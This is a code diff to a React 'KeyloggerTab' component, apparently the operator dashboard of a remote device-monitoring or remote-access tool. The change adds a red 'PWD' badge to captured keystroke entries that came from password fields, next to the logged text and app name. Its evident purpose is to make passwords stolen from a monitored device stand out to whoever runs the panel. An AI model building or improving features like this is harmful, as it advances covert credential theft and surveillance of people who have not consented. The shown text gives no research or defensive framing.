@@ -194,6 +194,9 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                 </div>
                 <div className="kl-entry-body">
                   <span className="kl-app-name">{(entry.appName || entry.packageName || '').split('.').pop()}</span>
+                  {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
+                    <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
+                  )}
                   <span className="kl-text">{entry.text}</span>
                 </div>
                 <div className="kl-ts">{entry.timestamp?.slice(11, 19) || ''}</div>
